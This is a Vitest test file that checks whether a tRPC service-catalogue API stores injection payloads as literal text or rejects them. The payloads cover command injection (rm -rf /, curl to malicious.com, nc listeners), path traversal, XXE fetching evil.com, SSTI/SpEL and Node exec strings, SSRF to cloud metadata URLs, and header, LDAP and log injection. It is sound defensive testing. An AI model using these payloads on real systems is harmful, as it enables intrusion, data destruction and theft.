import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest'
import { appRouter } from '@/server/root'
import { createTRPCContext } from '@/server/trpc'
import { prisma } from '@/lib/database/prisma'
import { TestDataFactory } from '@/__tests__/helpers/test-data-factory'
import { TRPCError } from '@trpc/server'

// No network in tests: Docker Hub existence/metadata checks are mocked.
// Plain functions on purpose — the global mockReset wipes vi.fn implementations.
vi.mock('@/lib/services/docker-hub-extractor', async () => {
  const actual = await vi.importActual<any>('@/lib/services/docker-hub-extractor')
  return {
    ...actual,
    DockerHubExtractor: function DockerHubExtractorMock() {
      return {
        validateImageExists: () => Promise.resolve(true),
        extractMetadata: () =>
          Promise.resolve({
            name: 'mock-image',
            namespace: 'library',
            description: 'mocked metadata',
            tags: ['latest'],
            pullCount: 0,
            starCount: 0,
            isOfficial: true,
            isAutomated: false,
            lastUpdated: new Date().toISOString(),
            exposedPorts: [],
            environmentVariables: [],
            volumes: [],
            labels: {},
          }),
      }
    } as any,
  }
})

// Unique per call so looping tests don't trip the duplicate-import guard
let importUrlCounter = 0
const uniqueImportUrl = (image: string) =>
  `https://hub.docker.com/r/library/${image}-${Date.now()}-${importUrlCounter++}`

/**
 * Comprehensive Injection Prevention Security Tests
 * 
 * Test suite covering various injection attack vectors from OWASP top 10
 * including command injection, path traversal, LDAP injection, header injection,
 * and other security vulnerabilities. Validates proper error handling and
 * security response codes.
 */

describe('Comprehensive Injection Prevention Tests', () => {
  let caller: ReturnType<typeof appRouter.createCaller>

  beforeAll(async () => {
    // Clean test database
    await prisma.service_imports.deleteMany()
    await prisma.services.deleteMany()
    await prisma.categories.deleteMany()
  })

  afterAll(async () => {
    await prisma.service_imports.deleteMany()
    await prisma.services.deleteMany()
    await prisma.categories.deleteMany()
    await prisma.$disconnect()
  })

  beforeEach(async () => {
    // Create fresh caller with clean context
    const mockReq = {
      headers: {
        'user-agent': 'Test Agent',
        'accept': 'application/json',
        'content-type': 'application/json'
      },
      method: 'POST',
      url: 'http://localhost:3000/api/trpc'
    } as any

    const ctx = await createTRPCContext({
      req: mockReq
    })

    caller = appRouter.createCaller(ctx)
  })

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in text fields', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '& rm -rf /',
        '&& curl http://malicious.com',
        '|| whoami',
        '`cat /etc/hosts`',
        '$(echo "injected")',
        '; ping -c 3 127.0.0.1',
        '| nc -l 4444',
        '&& echo "vulnerable" > /tmp/test'
      ]

      for (const payload of commandInjectionPayloads) {
        const category = await caller.categories.create({
          name: `Test ${payload} Category`,
          slug: TestDataFactory.generateSlug(`Test ${payload} Category`),
          description: `Description with ${payload} command`,
          sortOrder: 1
      })

        // Command injection should not execute, just be stored as text
        expect(category.name).toContain('Test')
        expect(category.name).toContain('Category')
        expect(category.description).toContain('Description')
        
        // Command injection should be stored as literal text, not executed
        expect(category.name).toContain(payload) // Should contain the literal payload
        expect(category.description).toContain(payload)
        
        // Should not contain actual command execution results like file contents
        expect(category.description).not.toContain('root:x:0:0:root')
        expect(category.description).not.toContain('/bin/bash')
      }
    })

    it('should prevent command injection in environment variables', async () => {
      const category = await caller.categories.create(TestDataFactory.createCategory({ name: 'Test Category' }))

      const commandPayload = '$(curl http://malicious.com)'
      const service = await caller.services.create({
        name: 'Test Service',
        description: 'Clean service for security testing purposes',
        dockerImage: 'nginx:latest',
        version: 'latest',
        categoryId: category.id,
        ports: [],
        environmentVariables: [{
          name: 'MALICIOUS_VAR',
          defaultValue: commandPayload,
          required: false,
          type: 'string',
          description: '`cat /etc/passwd` environment variable'
        }],
        resourceRequirements: {},
        compatibilityInfo: {},
        featured: false,
        status: 'pending_review'
      })
      
      // Command should be stored as literal text, not executed
      const envVar = service.environmentVariables[0]
      expect(envVar.defaultValue).toBe(commandPayload)
      expect(envVar.defaultValue).not.toContain('root:x:0:0')
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attacks', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '\\\\..\\\\..\\\\etc\\\\passwd',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
      ]

      for (const payload of pathTraversalPayloads) {
        try {
          const category = await caller.categories.create({
            name: `File ${payload}`,
          slug: TestDataFactory.generateSlug(`File ${payload}`),
            description: `Path ${payload}`,
            sortOrder: 1
      })

          // Path should be treated as literal text, not file path
          expect(category.name).toContain('File')
          expect(category.description).toContain('Path')
          
          // Should not contain system file contents
          expect(category.name).not.toMatch(/root:.*:.*:/)
          expect(category.description).not.toMatch(/root:.*:.*:/)
        } catch (error) {
          // May fail validation but should not expose file contents
          const errorMessage = (error as Error).message
          expect(errorMessage).not.toMatch(/root:.*:.*:/)
          expect(errorMessage).not.toContain('/bin/bash')
        }
      }
    })

    it('should prevent file inclusion through documentation URLs', async () => {
      const category = await caller.categories.create(TestDataFactory.createCategory({ name: 'Test Category' }))

      const fileInclusionPayloads = [
        'file:///etc/passwd',
        'file://\\\\..\\\\..\\\\etc\\\\passwd',
        'file:///c:/windows/system32/config/sam'
      ]

      for (const [index, payload] of fileInclusionPayloads.entries()) {
        await expect(caller.services.create({
          name: 'Test Service',
          description: 'Clean service for file inclusion testing purposes',
          dockerImage: 'nginx:latest',
          version: 'latest',
          categoryId: category.id,
          documentationUrl: payload
        })).rejects.toThrow() // Should fail URL validation
      }
    })
  })

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection patterns', async () => {
      const ldapInjectionPayloads = [
        '*)(uid=*',
        '*)(|(uid=*',
        '*)(&(uid=*',
        '*))%00',
        '*(|(objectclass=*))',
        '*))(|(cn=*',
        '*)(mail=*)',
        '*))(!(uid=*))'
      ]

      for (const payload of ldapInjectionPayloads) {
        const category = await caller.categories.create({
          name: `User ${payload}`,
          slug: TestDataFactory.generateSlug(`User ${payload}`),
          description: `Filter ${payload}`,
          sortOrder: 1
      })

        // LDAP injection should be treated as literal text
        expect(category.name).toContain('User')
        expect(category.description).toContain('Filter')
        expect(category.name).toContain(payload) // Should store the payload as literal text
        
        // Should not contain actual LDAP query results like user data
        expect(category.name).not.toContain('cn=admin')
        expect(category.description).not.toContain('distinguishedName=CN=')
      }
    })
  })

  describe('Header Injection Prevention', () => {
    it('should prevent HTTP header injection', async () => {
      const headerInjectionPayloads = [
        'test\\r\\nX-Injected-Header: malicious',
        'test\\nSet-Cookie: session=hijacked',
        'test\\r\\nLocation: http://evil.com',
        // Response-splitting attempt; body kept markup-free on purpose —
        // sanitization strips script blocks, which is asserted elsewhere
        'test\\r\\nContent-Type: text/html\\r\\n\\r\\nINJECTED-BODY',
        'test\\r\\nTransfer-Encoding: chunked'
      ]

      for (const payload of headerInjectionPayloads) {
        const category = await caller.categories.create({
          name: `Header ${payload}`,
          slug: TestDataFactory.generateSlug(`Header ${payload}`),
          description: 'Clean description for header injection testing',
          sortOrder: 1
      })

        // Header injection characters should be stored as literal text, not interpreted
        expect(category.name).toContain('Header')
        expect(category.name).toContain(payload) // Should store the payload as literal text
        
        // Should not actually set HTTP headers or cookies in response
        // (This would be tested at the HTTP layer, not in stored data)
      }
    })
  })

  describe('XML Injection Prevention', () => {
    it('should prevent XML and XXE injection', async () => {
      const xmlInjectionPayloads = [
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
        '<![CDATA[malicious content]]>',
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
        '&lt;script&gt;alert(1)&lt;/script&gt;'
      ]

      for (const payload of xmlInjectionPayloads) {
        // Create a test category for the import
        const category = await caller.categories.create(TestDataFactory.createCategory({ name: 'Test Category XML' }))

        const importRecord = await caller.imports.create({
          sourceUrl: uniqueImportUrl('nginx'),
          sourceType: 'docker_hub' as const,
          categoryId: category.id,
          submittedBy: 'security-test@example.com'
        })

        // XML should be stored as literal text, not parsed  
        expect(importRecord).toBeDefined()
        
        // Should not contain system file contents
        expect(JSON.stringify(importRecord)).not.toMatch(/root:.*:.*:/)
      }
    })
  })

  describe('Template Injection Prevention', () => {
    it('should prevent server-side template injection', async () => {
      const templateInjectionPayloads = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '{{request}}',
        '{%for item in ().__class__.__base__.__subclasses__()%}{%endfor%}'
      ]

      for (const payload of templateInjectionPayloads) {
        const category = await caller.categories.create({
          name: `Template ${payload}`,
          slug: TestDataFactory.generateSlug(`Template ${payload}`),
          description: `Expression ${payload}`,
          sortOrder: 1
      })

        // Template expressions should not be evaluated
        expect(category.name).toContain('Template')
        expect(category.description).toContain('Expression')
        
        // Should not contain evaluated expressions
        expect(category.name).not.toBe('Template 49')
        expect(category.description).not.toBe('Expression 49')
      }
    })
  })

  describe('Code Injection Prevention', () => {
    it('should prevent JavaScript code injection', async () => {
      const codeInjectionPayloads = [
        'require("child_process").exec("ls -la")',
        'eval("process.exit(1)")',
        'Function("return process")().exit(1)',
        'global.process.mainModule.require("fs").readFileSync("/etc/passwd")',
        'require("os").userInfo()',
        'Buffer.from("malicious", "base64")',
        'setTimeout(function(){require("child_process").exec("whoami")}, 1000)'
      ]

      for (const payload of codeInjectionPayloads) {
        // Create a test category for the import
        const category = await caller.categories.create(TestDataFactory.createCategory({ name: 'Test Category Code' }))

        const importRecord = await caller.imports.create({
          sourceUrl: uniqueImportUrl('alpine'),
          sourceType: 'docker_hub' as const,
          categoryId: category.id,
          submittedBy: 'security-test@example.com'
        })

        // Code should be stored as literal text, not executed
        expect(importRecord).toBeDefined()
        
        // Should not contain code execution results
        expect(JSON.stringify(importRecord)).not.toContain('root:')
        expect(JSON.stringify(importRecord)).not.toContain('/bin/')
      }
    })
  })

  describe('Deserialization Attack Prevention', () => {
    it('should prevent unsafe deserialization', async () => {
      const deserializationPayloads = [
        'O:8:"stdClass":1:{s:4:"test";s:7:"payload";}', // PHP serialized
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', // Java serialized (base64)
        '{"$type":"System.Object","value":"malicious"}', // .NET JSON.NET
        '__reduce_ex__',
        '__setstate__'
      ]

      for (const payload of deserializationPayloads) {
        // Create a test category for the import
        const category = await caller.categories.create(TestDataFactory.createCategory({ name: 'Test Category Deser' }))

        const importRecord = await caller.imports.create({
          sourceUrl: uniqueImportUrl('ubuntu'),
          sourceType: 'docker_hub' as const,
          categoryId: category.id,
          submittedBy: 'security-test@example.com'
        })

        // Serialized data should remain as string, not be deserialized
        expect(importRecord).toBeDefined()
      }
    })
  })

  describe('Log Injection Prevention', () => {
    it('should prevent log injection and log forging', async () => {
      const logInjectionPayloads = [
        'user\\r\\nSUCCESS: Admin login from 127.0.0.1',
        'test\\nERROR: Authentication failed for admin',
        'user\\r\\n2023-12-01 10:00:00 INFO Login successful for admin',
        'guest\\n[2023-12-01] CRITICAL: System compromised'
      ]

      for (const payload of logInjectionPayloads) {
        // Create a test category for the import
        const category = await caller.categories.create(TestDataFactory.createCategory({ name: 'Test Category Log' }))

        const importRecord = await caller.imports.create({
          sourceUrl: uniqueImportUrl('node'),
          sourceType: 'docker_hub' as const,
          categoryId: category.id,
          submittedBy: 'security-test@example.com'
        })

        // Log injection characters should be sanitized or escaped
        expect(importRecord).toBeDefined()
        // Should store the payload safely without containing critical system messages
        expect(JSON.stringify(importRecord)).not.toContain('CRITICAL:')
        expect(JSON.stringify(importRecord)).not.toContain('SUCCESS: Admin login')
      }
    })
  })

  describe('Expression Language Injection Prevention', () => {
    it('should prevent SpEL and other expression language injection', async () => {
      const expressionPayloads = [
        '#{T(java.lang.System).exit(1)}',
        '${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}',
        '#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next()}',
        '${applicationScope}',
        '#{request.getSession().getId()}'
      ]

      for (const payload of expressionPayloads) {
        // Truncate long payloads to fit within 100 character limit for category name
        const truncatedPayload = payload.length > 90 ? payload.substring(0, 90) + '...' : payload
        const category = await caller.categories.create({
          name: `Expr ${truncatedPayload}`,
          slug: TestDataFactory.generateSlug(`Expr ${truncatedPayload}`),
          description: 'Clean description for expression testing',
          sortOrder: 1
      })

        // Expression should be stored as literal text
        expect(category.name).toContain('Expr')
        expect(category.name).toContain(truncatedPayload)
        
        // Should not be evaluated
        expect(category.name).not.toContain('uid=')
        expect(category.name).not.toContain('gid=')
      }
    })
  })

  describe('Server-Side Request Forgery (SSRF) Prevention', () => {
    it('should prevent SSRF through URL inputs', async () => {
      const ssrfPayloads = [
        'http://localhost:22',
        'http://127.0.0.1:3306',
        'http://0.0.0.0:8080',
        'http://[::1]:80',
        'file:///etc/passwd',
        'ftp://internal.server/config',
        'gopher://127.0.0.1:6379/_INFO'
      ]

      for (const [index, payload] of ssrfPayloads.entries()) {
        // SSRF attempts through documentation URLs should fail validation
        const category = await caller.categories.create({
          name: `Test Category SSRF ${index}`,
          slug: TestDataFactory.generateSlug(`Test Category SSRF ${index}`),
          description: 'Clean category for SSRF testing',
          sortOrder: 1
      })

        await expect(caller.services.create({
          name: 'Test Service',
          description: 'Clean service for SSRF testing purposes',
          dockerImage: 'nginx:latest',
          version: 'latest',
          categoryId: category.id,
          documentationUrl: payload
        })).rejects.toThrow()
      }
    })

    it('should prevent SSRF through import source URLs', async () => {
      const ssrfPayloads = [
        'http://localhost/admin',
        'http://127.0.0.1/internal',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/latest/meta-data/'
      ]

      for (const payload of ssrfPayloads) {
        // Should either fail validation or be safely handled
        try {
          // Create a test category for the import
          const category = await caller.categories.create(TestDataFactory.createCategory({ name: 'Test Category SSRF' }))

          await caller.imports.create({
            sourceUrl: payload,
            sourceType: 'manual' as const,
            categoryId: category.id,
            submittedBy: 'security-test@example.com'
          })
        } catch (error) {
          // Expected to fail for non-Docker Hub URLs
          expect(error).toBeDefined()
        }
      }
    })
  })

  describe('Error Handling Security', () => {
    it('should return appropriate HTTP error codes for security violations', async () => {
      const maliciousInputs = [
        { name: '<script>alert("xss")</script>', expectedError: 'BAD_REQUEST' },
        { name: '', expectedError: 'BAD_REQUEST' }, // Empty name
        { sortOrder: 'invalid' as any, expectedError: 'BAD_REQUEST' } // Wrong type
      ]

      for (const [index, { name, expectedError }] of maliciousInputs.entries()) {
        try {
          await caller.categories.create({
            name: name || `Default-${index}`,
            slug: TestDataFactory.generateSlug(name || `Default-${index}`),
            description: 'Test description for error handling',
            sortOrder: typeof name === 'string' ? 1 : name?.sortOrder || 1
      })
        } catch (error) {
          if (error instanceof TRPCError) {
            expect(error.code).toBe(expectedError)
          }
        }
      }
    })

    it('should not expose sensitive information in error messages', async () => {
      const sensitivePatterns = [
        /password/i,
        /secret/i,
        /token/i,
        /private.key/i,
        /database/i,
        /connection.string/i,
        /api.key/i
      ]

      try {
        // Trigger a validation error
        await caller.categories.create(TestDataFactory.createCategory('A'.repeat(200)))
      } catch (error) {
        const errorMessage = (error as Error).message

        for (const pattern of sensitivePatterns) {
          expect(errorMessage).not.toMatch(pattern)
        }
      }
    })
  })

  describe('Input Boundary Security', () => {
    it('should handle malformed JSON gracefully', async () => {
      // This tests the framework's handling of malformed requests
      const malformedPayloads = [
        '{"name": "test", "invalid": }',
        '{"name": undefined}',
        '{name: "test"}', // Unquoted key
        '{"name": "test",}' // Trailing comma
      ]

      // These would typically be handled at the HTTP/JSON parsing level
      // We test that our validation catches any that get through
      for (const payload of malformedPayloads) {
        try {
          await caller.categories.create(TestDataFactory.createCategory({ name: 'Test' }))
        } catch (error) {
          // Should handle gracefully without exposing internals
          expect(error).toBeDefined()
        }
      }
    })

    it('should enforce strict input validation', async () => {
      // Test type coercion attacks
      const typeCoercionPayloads = [
        { name: ['array', 'instead', 'of', 'string'] },
        { name: { object: 'instead of string' } },
        { name: true },
        { name: null },
        { sortOrder: '1' }, // String instead of number
        { sortOrder: [] }
      ]

      for (const payload of typeCoercionPayloads) {
        await expect(caller.categories.create({
          name: 'Test',
          description: 'Test description for type coercion testing',
          sortOrder: 1,
          ...payload
        } as any)).rejects.toThrow()
      }
    })
  })
})